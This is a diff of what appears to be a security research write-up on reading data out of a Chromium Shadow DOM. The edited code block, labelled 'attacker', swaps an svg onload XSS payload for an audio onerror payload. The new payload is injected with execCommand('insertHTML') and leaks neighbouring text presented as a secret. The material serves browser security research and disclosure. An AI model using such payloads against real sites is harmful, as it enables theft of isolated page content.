@@ -237,10 +237,11 @@ div.setAttribute('contenteditable', 'true');
 
 // attacker
 setTimeout(() => {
+    console.log(1, 'stolen secret:');
+    const bypass = '<audio/src/onerror=console.log(2,this.nextSibling.innerHTML)>';
     find('Secret is:'); // assuming the Shadow includes predictable text
     // assuming the found node is contenteditable=true
-    document.execCommand('insertHTML', false, '<svg/onload=console.log(2,this)>')
-    console.log(1, 'stolen secret: ');
+    document.execCommand("insertHTML", false, bypass);
 });
 </code></pre>
 <img width="800" src="./assets/img3.png" alt="ShadowDOM bypass Chromium"/>
